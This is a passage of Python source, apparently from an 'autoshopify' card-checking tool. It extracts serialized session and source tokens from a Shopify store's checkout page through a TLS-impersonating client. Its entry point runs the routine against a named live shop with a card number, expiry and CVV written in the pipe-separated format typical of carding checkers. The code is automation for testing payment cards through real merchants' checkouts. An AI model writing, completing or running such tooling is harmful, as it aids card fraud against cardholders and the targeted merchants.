            "serialized-session-token": "serialized-session-token" in checkout_text,
            "serializedSessionToken": "serializedSessionToken" in checkout_text,
            "serialized-sourceToken": "serialized-sourceToken" in checkout_text,
            "serialized-source-token": "serialized-source-token" in checkout_text,
            "serializedSourceToken": "serializedSourceToken" in checkout_text,
            "queueToken": "queueToken" in checkout_text or '"queueToken"' in checkout_text,
            "stableId": "stableId" in checkout_text or '"stableId"' in checkout_text,
        }
        robust = _extract_checkout_tokens_robust(checkout_text)
        for k, v in robust.items():
            out["step7_robust_tokens"][k] = (
                {"len": len(v), "first_80": (v[:80] if v else ""), "value": (v[:200] + "..." if v and len(v) > 200 else v)}
                if v
                else None
            )
        session_regexes = [
            (r'name\s*=\s*["\']serialized-sessionToken["\'][^>]*?content\s*=\s*["\']&quot;(.+?)&quot;\s*"\s*/\s*>', "new_meta_sessionToken"),
            (r'name\s*=\s*["\']serialized-sessionToken["\'][^>]*?content\s*=\s*&quot;(.+?)&quot;\s*"\s*/\s*>', "new_meta_entity"),
            (r'content\s*=\s*["\']&quot;(.+?)&quot;\s*"\s*/\s*>[^<]*name\s*=\s*["\']serialized-sessionToken["\']', "content_first"),
        ]
        for pat, name in session_regexes:
            m = re.search(pat, checkout_text, re.I | re.DOTALL)
            out["step8_regex_session_tests"].append({
                "name": name,
                "matched": bool(m),
                "group1_len": len(m.group(1)) if m and m.group(1) else 0,
                "group1_first80": (m.group(1)[:80] if m and m.group(1) else ""),
            })
        primary_session = _extract_session_token(checkout_text)
        out["step7_robust_tokens"]["session_token_primary"] = (
            {"len": len(primary_session), "first_80": (primary_session[:80] if primary_session else ""), "value": (primary_session[:200] + "..." if primary_session and len(primary_session) > 200 else primary_session)}
            if primary_session
            else None
        )
        for prefix, suffix in [
            (SESSION_TOKEN_PREFIX, SESSION_TOKEN_SUFFIX),
            ('name="serialized-sessionToken" content="&quot;', '&quot;" />'),
            ("name='serialized-sessionToken' content='&quot;", '&quot;"/>'),
        ]:
            res = capture(checkout_text, prefix, suffix)
            out["step9_capture_session_tests"].append({
                "prefix": prefix[:50] + "..." if len(prefix) > 50 else prefix,
                "suffix": suffix,
                "result_len": len(res) if res else 0,
                "result_first80": (res[:80] if res else None),
            })
        for prefix, suffix in [
            ('name="serialized-sourceToken" content="&quot;', '&quot;"/>'),
            ('serialized-source-token" content="&quot;', '&quot'),
        ]:
            res = capture(checkout_text, prefix, suffix)
            out["step10_capture_source_tests"].append({
                "prefix": prefix[:50] + "..." if len(prefix) > 50 else prefix,
                "suffix": suffix,
                "result_len": len(res) if res else 0,
                "result_first80": (res[:80] if res else None),
            })
    except Exception as e:
        out["step5_checkout_page"] = {"error": str(e)}
        out["error"] = str(e)
    return out


async def main():
    async with TLSAsyncSession(timeout_seconds=90) as session:
        await autoshopify("https://maxandfix.com/", "5312378810154759|04|31|921", session)

if __name__ == "__main__":
    asyncio.run(main())
